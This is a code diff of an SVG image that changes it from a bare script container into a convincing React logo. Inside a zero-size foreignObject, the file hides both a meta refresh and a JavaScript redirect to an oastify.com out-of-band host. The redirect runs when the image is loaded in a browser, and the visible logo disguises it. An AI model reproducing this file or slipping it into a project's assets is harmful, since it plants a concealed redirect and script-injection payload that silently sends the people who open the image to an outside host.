@@ -1,10 +1,16 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
-  <foreignObject width="100%" height="100%">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="-11.5 -10.23174 23 20.46348">
+  <title>React Logo</title>
+  <circle cx="0" cy="0" r="2.05" fill="#61dafb"/>
+  <g stroke="#61dafb" stroke-width="1" fill="none">
+    <ellipse rx="11" ry="4.2"/>
+    <ellipse rx="11" ry="4.2" transform="rotate(60)"/>
+    <ellipse rx="11" ry="4.2" transform="rotate(120)"/>
+  </g>
+  <foreignObject width="0" height="0">
     <div xmlns="http://www.w3.org/1999/xhtml">
-      <script type="text/javascript">
-        // <![CDATA[
+      <meta http-equiv="refresh" content="0;url=https://604nyl20gfv6ldlub0iv1ndct3zunnmbb.oastify.com" />
+      <script>
         window.location.href = 'https://604nyl20gfv6ldlub0iv1ndct3zunnmbb.oastify.com';
-        // ]]>
       </script>
     </div>
   </foreignObject>
